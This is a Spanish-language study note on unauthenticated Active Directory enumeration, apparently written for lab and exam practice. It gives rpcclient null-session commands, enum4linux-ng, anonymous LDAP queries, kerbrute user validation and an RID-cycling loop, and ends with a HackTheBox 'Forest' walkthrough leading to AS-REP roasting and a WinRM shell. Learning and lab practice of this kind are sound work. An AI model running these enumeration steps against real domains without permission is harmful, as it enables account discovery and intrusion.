# Enumeración de AD sin credenciales

Relacionadas: [[sacar-nombre-de-dominio]] · [[dns-en-ad]] · [[ldap]] · [[kerberos-kdc]] · [[asrep-roasting]] · [[kerberoasting]] · [[netexec]] · [[impacket]] · [[montar-lab-ad]] · [[metodologia]]

> **Dónde estoy en la metodología:** ya sé que es un DC (puertos 88/389/445...) y ya tengo el [[sacar-nombre-de-dominio|nombre del dominio]]. Ahora, **sin ninguna credencial**, quiero sacar todo lo posible — sobre todo una **lista de usuarios válidos**, porque es lo que alimenta [[asrep-roasting]] y [[kerberoasting]].

---

## 0. Preparación (SIEMPRE antes de tocar Kerberos)

Dos pasos que evitan errores crípticos. Causa nº1 de "no me funciona y no sé por qué":

```bash
# 1. Resolución de nombres: Kerberos trabaja con FQDN, no con IPs
echo "10.10.10.10  dominio.local dc01.dominio.local dc01" | sudo tee -a /etc/hosts

# 2. Sincronizar reloj con el DC (Kerberos solo tolera 5 min de desfase)
sudo ntpdate 10.10.10.10        # o: sudo rdate -n 10.10.10.10
```

El porqué del reloj: el timestamp cifrado de Kerberos es una defensa anti-replay. Si tu
reloj se aleja >5 min del DC → `KRB_AP_ERR_SKEW_TOO_BIG` y crees que la técnica falla.
(El `nmap -sC` te da el `clock-skew` → si es alto, sincroniza sí o sí.)

---

## 1. El objetivo: una lista de usuarios

Todo lo demás depende de esto. Sin usuarios no hay AS-REP ni Kerberoast. La fuente más
generosa en DCs mal configurados es la **sesión nula (null session)** por RPC o SMB.

### rpcclient — sesión nula ⭐

```bash
rpcclient -U "" -N 10.10.10.10
```

`-U ""` = usuario vacío, `-N` = sin contraseña. Ya dentro del prompt `rpcclient $>`:

```
enumdomusers      # <- la lista de usuarios (lo que buscas)
enumdomgroups     # grupos del dominio
querydispinfo     # usuarios + descripción (a veces hay passwords en la descripción!)
queryuser 0x47b   # detalle de un usuario por su RID
getdompwinfo      # política de contraseñas (longitud mínima, lockout)
lsaenumsid        # SIDs conocidos
```

### Cómo leer `enumdomusers` (ruido vs señal)

```
user:[svc-alfresco] rid:[0x47b]
       └─ nombre         └─ RID (Relative ID) en hexadecimal
```

El **RID** identifica la cuenta dentro del dominio. Sirve para separar grano de paja:

| Patrón | Qué es | ¿Útil? |
|---|---|---|
| RID `0x1f4`(500)=Administrator, `0x1f5`(501)=Guest, `0x1f6`(502)=krbtgt | cuentas por defecto de todo AD | ruido |
| `SM_xxxx`, `HealthMailbox*`, `$...` | cuentas automáticas de Exchange | **ruido** |
| RIDs altos y correlativos (0x479, 0x47a...) | cuentas **creadas por el admin** | **SEÑAL** ✅ |

Dentro de la señal, fíjate en los **prefijos de cuenta de servicio** (`svc-`, `sql`, `backup`,
`svc_`): candidatas nº1 a [[asrep-roasting]] (flag no-preauth) y [[kerberoasting]] (SPN).

Guarda los usuarios reales en `users.txt` (uno por línea), filtrando el ruido a mano.

---

## 2. enum4linux-ng — lo automatiza casi todo

```bash
enum4linux-ng -A 10.10.10.10            # -A = todo (users, grupos, shares, política, OS)
enum4linux-ng -A -u '' -p '' 10.10.10.10
```

Buen primer barrido: saca dominio, usuarios, grupos, shares SMB y política de contraseñas
de un tirón. Pero **entiende lo que hace por debajo** (rpcclient/ldap) para no depender de él.

---

## 3. LDAP anónimo — a veces suelta el oro

```bash
# naming context = el dominio (confirma el DN base)
ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts

# rootDSE completo (dnsHostName, nivel funcional, etc.)
ldapsearch -x -H ldap://10.10.10.10 -s base

# si deja consultar sin login: volcar todos los objetos
ldapsearch -x -H ldap://10.10.10.10 -b "DC=dominio,DC=local"
```

En DCs viejos o mal configurados el bind anónimo deja listar usuarios y hasta ver el campo
`description` (donde a veces hay contraseñas apuntadas). Ver [[ldap]] para el detalle del árbol.

---

## 4. kerbrute — validar usuarios vía Kerberos (sin bloquear cuentas)

```bash
kerbrute userenum -d dominio.local --dc 10.10.10.10 users.txt
```

El porqué: pregunta al KDC por pre-autenticación. Un usuario **que existe** responde distinto
a uno que no → confirmas usuarios válidos **sin intentar logins** (no incrementa el contador
de lockout). Ideal cuando solo tienes una lista de nombres candidatos (p.ej. de OSINT o
`nombres.txt` + `apellidos.txt`).

---

## 5. RID cycling (cuando enumdomusers está capado pero hay null session)

Si `enumdomusers` no devuelve nada pero sí hay acceso null, se pueden enumerar cuentas
iterando RIDs y resolviéndolos a nombres:

```bash
# con netexec (ver [[netexec]])
nxc smb 10.10.10.10 -u '' -p '' --rid-brute 4000

# o a mano con rpcclient
for i in $(seq 500 1500); do rpcclient -U "" -N 10.10.10.10 \
  -c "lookupsids S-1-5-21-DOM-$i"; done
```

---

## 6. Flujo de decisión (lo que hago en orden)

```
¿Es DC? (88/389/445)  →  sacar nombre de dominio ([[sacar-nombre-de-dominio]])
      │
      ▼
/etc/hosts + sincronizar reloj
      │
      ▼
rpcclient -U "" -N  →  enumdomusers  ──►  users.txt (filtrar ruido)
      │  (si capado → RID cycling / enum4linux-ng / ldap anónimo)
      ▼
kerbrute userenum   →  validar users.txt
      │
      ▼
CON la lista de usuarios, SIN credenciales todavía:
   ├─ [[asrep-roasting]]   (GetNPUsers -no-pass)   ← gratis, intentar SIEMPRE
   └─ (si luego consigo creds) → [[kerberoasting]], BloodHound...
```

---

## 🔑 Lo que DEBO recordar (checklist)

- [ ] `/etc/hosts` + reloj sincronizado **antes** de Kerberos
- [ ] `rpcclient -U "" -N` → `enumdomusers` es el primer tiro
- [ ] Filtrar ruido: `SM_`, `HealthMailbox`, `$`, RIDs fijos 500/501/502
- [ ] Prefijo `svc-` = cuenta de servicio = objetivo prioritario
- [ ] `users.txt` limpio → alimenta [[asrep-roasting]]
- [ ] Todo **manual y sin Metasploit** → exam-friendly

---

## Caso real — Forest (HTB, 2026-10-26)

`rpcclient -U "" -N` → `enumdomusers` soltó la lista completa. Entre el ruido de Exchange
(`SM_*`, `HealthMailbox*`) aparecían 6 usuarios reales (RIDs 0x479–0x480), uno con prefijo
`svc-alfresco`. Esa cuenta tenía `DONT_REQUIRE_PREAUTH` → [[asrep-roasting]] directo sin
credenciales → crack → shell por WinRM. Foothold de libro con esta misma metodología.
